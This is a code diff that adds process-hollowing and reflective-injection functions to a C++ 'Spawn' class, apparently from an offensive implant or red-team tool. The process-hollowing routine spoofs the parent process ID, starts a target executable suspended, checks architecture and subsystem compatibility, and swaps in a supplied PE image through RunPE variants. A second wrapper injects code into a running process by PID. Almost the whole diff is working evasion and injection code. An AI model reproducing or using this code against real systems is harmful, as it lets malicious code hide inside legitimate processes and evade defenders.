@@ -167,3 +167,269 @@ bool Spawn::start_exe(const char* exe_path, const char* args, unsigned int ppid)
         return false;
     }
 }
+
+bool Spawn::start_process_hollowing(const char* exe_path, LPVOID exe_data, unsigned int ppid)
+{
+#ifdef DEBUG
+	printf("[PROCESS HOLLOWING]\n");
+#endif
+
+	const BOOL bPE = IsValidPE(exe_data);
+	if (!bPE)
+	{
+#ifdef DEBUG
+		printf("[-] The PE file is not valid !\n");
+#endif
+		return false;
+	}
+
+#ifdef DEBUG
+	printf("[+] The PE file is valid.\n");
+#endif
+
+	/*
+	STARTUPINFOA SI;
+	PROCESS_INFORMATION PI;
+
+	ZeroMemory(&SI, sizeof(SI));
+	SI.cb = sizeof(SI);
+	ZeroMemory(&PI, sizeof(PI));
+	*/
+
+	// additional information
+	STARTUPINFOEX sie = { sizeof(sie) };
+	PROCESS_INFORMATION pi;
+
+	// set the size of the structures
+	ZeroMemory(&sie, sizeof(sie));
+	//sie.cb = sizeof(sie);
+	ZeroMemory(&pi, sizeof(pi));
+
+	/*
+	* Parent PID spoofing
+	*/
+	HANDLE hParentProcess = NULL;
+	PPROC_THREAD_ATTRIBUTE_LIST pAttributeList = NULL;
+	if (ppid != NULL)
+	{
+		pAttributeList = get_ppid_attribute_list(ppid, &hParentProcess);
+		if (pAttributeList == NULL)
+		{
+			return false;
+		}
+		sie.lpAttributeList = pAttributeList;
+	}
+
+	const BOOL bProcessCreation = CreateProcessA(exe_path, nullptr, nullptr, nullptr, TRUE, CREATE_SUSPENDED, nullptr, nullptr, &sie.StartupInfo, &pi);
+	if (!bProcessCreation)
+	{
+#ifdef DEBUG
+		printf("[-] An error is occured when trying to create the target process !\n");
+#endif
+		CleanAndExitProcess(&pi);
+		return false;
+	}
+
+	BOOL bTarget32;
+	IsWow64Process(pi.hProcess, &bTarget32);
+
+	ProcessAddressInformation ProcessAddressInformation = { nullptr, nullptr };
+	if (bTarget32)
+	{
+		ProcessAddressInformation = GetProcessAddressInformation32(&pi);
+		if (ProcessAddressInformation.lpProcessImageBaseAddress == nullptr || ProcessAddressInformation.lpProcessPEBAddress == nullptr)
+		{
+#ifdef DEBUG
+			printf("[-] An error is occured when trying to get the image base address of the target process !\n");
+#endif
+			CleanAndExitProcess(&pi);
+			return false;
+		}
+	}
+	else
+	{
+		ProcessAddressInformation = GetProcessAddressInformation64(&pi);
+		if (ProcessAddressInformation.lpProcessImageBaseAddress == nullptr || ProcessAddressInformation.lpProcessPEBAddress == nullptr)
+		{
+#ifdef DEBUG
+			printf("[-] An error is occured when trying to get the image base address of the target process !\n");
+#endif
+			CleanAndExitProcess(&pi);
+			return false;
+		}
+	}
+
+#ifdef DEBUG
+	printf("[+] Target Process PEB : 0x%p\n", ProcessAddressInformation.lpProcessPEBAddress);
+	printf("[+] Target Process Image Base : 0x%p\n", ProcessAddressInformation.lpProcessImageBaseAddress);
+#endif
+
+	const BOOL bSource32 = IsPE32(exe_data);
+#ifdef DEBUG
+	if (bSource32)
+		printf("[+] Source PE Image architecture : x86\n");
+	else
+		printf("[+] Source PE Image architecture : x64\n");
+
+	if (bTarget32)
+		printf("[+] Target PE Image architecture : x86\n");
+	else
+		printf("[+] Target PE Image architecture : x64\n");
+#endif
+
+	if (bSource32 && bTarget32 || !bSource32 && !bTarget32)
+	{
+#ifdef DEBUG
+		printf("[+] Architecture are compatible !\n");
+#endif
+	}
+	else
+	{
+#ifdef DEBUG
+		printf("[-] Architecture are not compatible !\n");
+#endif
+		CleanAndExitProcess(&pi);
+		return false;
+	}
+
+	DWORD dwSourceSubsystem;
+	if (bSource32)
+		dwSourceSubsystem = GetSubsytem32(exe_data);
+	else
+		dwSourceSubsystem = GetSubsytem64(exe_data);
+
+	if (dwSourceSubsystem == (DWORD)-1)
+	{
+#ifdef DEBUG
+		printf("[-] An error is occured when trying to get the subsytem of the source image.\n");
+#endif
+		CleanAndExitProcess(&pi);
+		return false;
+	}
+
+#ifdef DEBUG
+	printf("[+] Source Image subsystem : 0x%X\n", (UINT)dwSourceSubsystem);
+#endif
+
+	DWORD dwTargetSubsystem;
+	if (bTarget32)
+		dwTargetSubsystem = GetSubsystemEx32(pi.hProcess, ProcessAddressInformation.lpProcessImageBaseAddress);
+	else
+		dwTargetSubsystem = GetSubsystemEx64(pi.hProcess, ProcessAddressInformation.lpProcessImageBaseAddress);
+
+	if (dwTargetSubsystem == (DWORD)-1)
+	{
+#ifdef DEBUG
+		printf("[-] An error is occured when trying to get the subsytem of the target process.\n");
+#endif
+		CleanAndExitProcess(&pi);
+		return false;
+	}
+
+#ifdef DEBUG
+	printf("[+] Target Process subsystem : 0x%X\n", (UINT)dwTargetSubsystem);
+#endif
+
+	if (dwSourceSubsystem == dwTargetSubsystem)
+	{
+#ifdef DEBUG
+		printf("[+] Subsytems are compatible.\n");
+#endif
+	}
+	else
+	{
+#ifdef DEBUG
+		printf("[-] Subsytems are not compatible.\n");
+#endif
+		CleanAndExitProcess(&pi);
+		return false;
+	}
+
+	BOOL bHasReloc;
+	if (bSource32)
+		bHasReloc = HasRelocation32(exe_data);
+	else
+		bHasReloc = HasRelocation64(exe_data);
+
+#ifdef DEBUG
+	if (!bHasReloc)
+		printf("[+] The source image doesn't have a relocation table.\n");
+	else
+		printf("[+] The source image has a relocation table.\n");
+#endif
+
+
+	if (bSource32 && !bHasReloc)
+	{
+		if (RunPE32(&pi, exe_data))
+		{
+#ifdef DEBUG
+			printf("[+] The injection has succeed !\n");
+#endif
+			CleanProcess(&pi);
+			return true;
+		}
+	}
+
+	if (bSource32 && bHasReloc)
+	{
+		if (RunPEReloc32(&pi, exe_data))
+		{
+#ifdef DEBUG
+			printf("[+] The injection has succeed !\n");
+#endif
+			CleanProcess(&pi);
+			return true;
+		}
+	}
+
+	if (!bSource32 && !bHasReloc)
+	{
+		if (RunPE64(&pi, exe_data))
+		{
+#ifdef DEBUG
+			printf("[+] The injection has succeed !\n");
+#endif
+			CleanProcess(&pi);
+			return true;
+		}
+	}
+
+	if (!bSource32 && bHasReloc)
+	{
+		if (RunPEReloc64(&pi, exe_data))
+		{
+#ifdef DEBUG
+			printf("[+] The injection has succeed !\n");
+#endif
+			CleanProcess(&pi);
+			return true;
+		}
+	}
+
+#ifdef DEBUG
+	printf("[-] The injection has failed !\n");
+#endif
+
+	if (pi.hThread != nullptr)
+		CloseHandle(pi.hThread);
+
+	if (pi.hProcess != nullptr)
+	{
+		TerminateProcess(pi.hProcess, -1);
+		CloseHandle(pi.hProcess);
+	}
+
+	return false;
+}
+
+bool Spawn::reflective_injection(unsigned int pid, LPVOID exe_data, size_t exe_data_size)
+{
+	BOOL success = InjectToProcess(pid, exe_data, exe_data_size);
+
+	if (success == TRUE)
+		return true;
+	else
+		return false;
+}
+
